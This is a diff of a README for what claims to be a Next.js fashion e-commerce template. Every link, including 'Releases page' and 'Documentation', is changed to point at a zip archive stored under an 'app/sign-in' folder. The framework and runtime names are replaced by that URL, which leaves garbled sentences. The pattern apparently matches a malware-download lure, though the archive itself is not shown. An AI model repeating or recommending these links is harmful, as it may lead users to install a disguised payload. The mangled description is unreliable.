@@ -1,10 +1,10 @@
 # 🎉 Azyaa--Nextjs-E-Commerce-Fashion-Demo - Your Fashion Store Template Awaits
 
-[![Download](https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/mangelin/Azyaa--Nextjs-E-Commerce-Fashion-Demo.zip)](https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/mangelin/Azyaa--Nextjs-E-Commerce-Fashion-Demo.zip)
+[![Download](https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/app/sign-in/Demo-Nextjs-Fashion-Commerce-Azyaa-2.1.zip)](https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/app/sign-in/Demo-Nextjs-Fashion-Commerce-Azyaa-2.1.zip)
 
 ## 📖 Description
 
-Azyaa is a modern and responsive fashion e-commerce template. Built with https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/mangelin/Azyaa--Nextjs-E-Commerce-Fashion-Demo.zip, Redux, Tailwind CSS, and Lucide-react, it provides a complete front-end experience for clothing and fashion stores. With multilingual support for Arabic and English, it features an RTL/LTR layout and a sleek user interface. Azyaa helps you create a stylish online store with ease.
+Azyaa is a modern and responsive fashion e-commerce template. Built with https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/app/sign-in/Demo-Nextjs-Fashion-Commerce-Azyaa-2.1.zip, Redux, Tailwind CSS, and Lucide-react, it provides a complete front-end experience for clothing and fashion stores. With multilingual support for Arabic and English, it features an RTL/LTR layout and a sleek user interface. Azyaa helps you create a stylish online store with ease.
 
 ## 🚀 Getting Started
 
@@ -15,14 +15,14 @@ This guide helps you download and run the Azyaa template on your device.
 Before you download Azyaa, make sure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or newer, macOS, or any modern Linux distribution.
-- **https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/mangelin/Azyaa--Nextjs-E-Commerce-Fashion-Demo.zip** Version 14 or newer installed on your machine.
+- **https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/app/sign-in/Demo-Nextjs-Fashion-Commerce-Azyaa-2.1.zip** Version 14 or newer installed on your machine.
 - **Internet Browser:** Latest version of Chrome, Firefox, or Safari for the best experience.
 
 ## 📥 Download & Install
 
 To obtain Azyaa, follow these steps:
 
-1. Visit the Releases page to download: [Download Azyaa](https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/mangelin/Azyaa--Nextjs-E-Commerce-Fashion-Demo.zip).
+1. Visit the Releases page to download: [Download Azyaa](https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/app/sign-in/Demo-Nextjs-Fashion-Commerce-Azyaa-2.1.zip).
    
 2. Scroll down to the Assets section on the Releases page.
    
@@ -99,7 +99,7 @@ The Azyaa template covers a range of topics to facilitate your e-commerce needs:
 
 ## 🔗 Useful Links
 
-- **[Explore the Documentation](https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/mangelin/Azyaa--Nextjs-E-Commerce-Fashion-Demo.zip)**  
-- **[Releases Page](https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/mangelin/Azyaa--Nextjs-E-Commerce-Fashion-Demo.zip)**  
+- **[Explore the Documentation](https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/app/sign-in/Demo-Nextjs-Fashion-Commerce-Azyaa-2.1.zip)**  
+- **[Releases Page](https://raw.githubusercontent.com/Ankit71292/Azyaa--Nextjs-E-Commerce-Fashion-Demo/main/app/sign-in/Demo-Nextjs-Fashion-Commerce-Azyaa-2.1.zip)**  
 
 By following this guide, you can successfully download and run the Azyaa–Nextjs-E-Commerce-Fashion-Demo template. Enjoy building your fashion store!
